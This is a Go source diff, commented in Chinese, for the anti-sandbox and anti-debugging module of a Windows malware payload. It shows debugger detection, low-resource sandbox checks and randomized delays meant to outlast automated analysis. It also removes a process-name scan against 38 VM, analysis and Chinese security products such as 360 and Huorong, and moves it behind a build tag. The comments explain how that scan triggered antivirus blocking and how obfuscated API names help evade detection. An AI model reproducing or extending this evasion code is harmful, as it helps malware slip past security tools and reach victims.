@@ -4,23 +4,28 @@ package main
 
 import (
 	"runtime"
-	"strings"
 	"time"
 	"unsafe"
-
-	"golang.org/x/sys/windows"
 )
 
 // 反沙箱/反调试（仅 Windows）：
-// 命中调试器、沙箱/虚拟化进程特征或典型低配资源环境时，延迟执行一段
-// 时间后再继续，干扰自动化分析与沙箱超时判定。
-// 策略为"延迟"而非"退出"，避免误伤正常主机。
-// 敏感 API 名与进程特征字符串由服务端编译期混淆为 xd("hex")，二进制无明文。
-
+// 命中调试器或典型低配资源环境时，延迟执行一段时间后再继续，干扰自动化分析
+// 与沙箱超时判定。策略为"延迟"而非"退出"，避免误伤正常主机。
+// 敏感 API 名由服务端编译期混淆为 xd("hex")，二进制无明文。
+//
+// ⚠️ v1.3.4 起**默认不做任何进程枚举**：
+// 原实现是"CreateToolhelp32Snapshot 遍历全部进程名 → 与 38 个安全软件/分析工具
+// 特征比对"，这是国产杀软主动防御**明确拦截**的对抗行为：实测在装有 360/电脑管家
+// 的主机上，带该逻辑的载荷一启动即 `Access is denied`（进程创建被拒）且文件被删除；
+// 同时它必须静态导入 toolhelp32 API 并携带一批安全软件进程名，绕过了 apihash
+// 免杀路径，属于"为了弱反沙箱能力付出强行为特征"的亏本买卖。
+//
+// 现在该逻辑移入 evasion_scan_windows.go，**只有构建时显式带 evasionscan 标签**
+// （生成载荷页的"主动反沙箱进程检测"选项）才参与编译，默认载荷里连字符串都不存在。
 func evasionInit() {
 	delay := time.Duration(0)
 
-	// 1. 反调试：IsDebuggerPresent
+	// 1. 反调试：IsDebuggerPresent（单次调用，无枚举行为）
 	isDbg := resolveAPI("kernel32.dll", "IsDebuggerPresent")
 	if err := isDbg.Find(); err == nil {
 		if r, _, _ := isDbg.Call(); r != 0 {
@@ -28,35 +33,9 @@ func evasionInit() {
 		}
 	}
 
-	// 2. 沙箱/虚拟化/分析工具进程特征（含常见国内杀软主动防御进程）
-	suspects := []string{
-		"vboxservice", "vboxtray", "vbox", "vmwaretray", "vmwareuser",
-		"vmacthlp", "vmsrvc", "vmtoolsd", "sandboxie", "sbiesvc",
-		"sbiectrl", "procmon", "procmon64", "tcpview", "autoruns",
-		"wireshark", "fiddler", "charles", "burpsuite", "ollydbg",
-		"x64dbg", "windbg", "ida64", "ida",
-		// 主动防御/安全软件特征进程（命中即延迟，干扰行为沙箱判定）
-		"qihoo", "qhsafetray", "qhactivedefense", "zhudongfangyu",
-		"360tray", "360safe", "360sd", "360se", "360zip", "huorong",
-		"hipsdaemon", "sysdiag", "wsctrl", "kxescore", "kxetray",
-	}
-	if snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0); err == nil {
-		defer windows.CloseHandle(snap)
-		var pe windows.ProcessEntry32
-		pe.Size = uint32(unsafe.Sizeof(pe))
-		for e := windows.Process32First(snap, &pe); e == nil; e = windows.Process32Next(snap, &pe) {
-			name := strings.ToLower(windows.UTF16ToString(pe.ExeFile[:]))
-			for _, s := range suspects {
+	// 2. 安全软件/沙箱进程特征：默认关闭（空实现），带 evasionscan 标签才有真实逻辑。
+	delay += evasionSuspectDelay()
 
-				if strings.Contains(name, s) {
-					delay += 5 * time.Second
-					goto resourceCheck
-				}
-			}
-		}
-	}
-
-resourceCheck:
 	// 3. 资源特征：CPU < 2 核或物理内存 < 2GB（典型沙箱低配配置）
 	if runtime.NumCPU() < 2 {
 		delay += 3 * time.Second
@@ -71,7 +50,7 @@ resourceCheck:
 
 	// 4. 随机运行延迟：0~3s，打乱自动化/行为沙箱对"启动即连/即行为"的判定节奏。
 	//    仅当检测到上述分析/安全特征时才叠加随机延迟；正常主机不额外延时。
-	//    保持轻量：启动随机延迟由配置 startup_delay_min/max 主导，这里只加少量扰动。
+	//    启动随机延迟由配置 startup_delay_min/max 主导，这里只加少量扰动。
 	if delay > 0 {
 		delay += time.Duration(time.Now().UnixNano()%3000) * time.Millisecond
 		time.Sleep(delay)
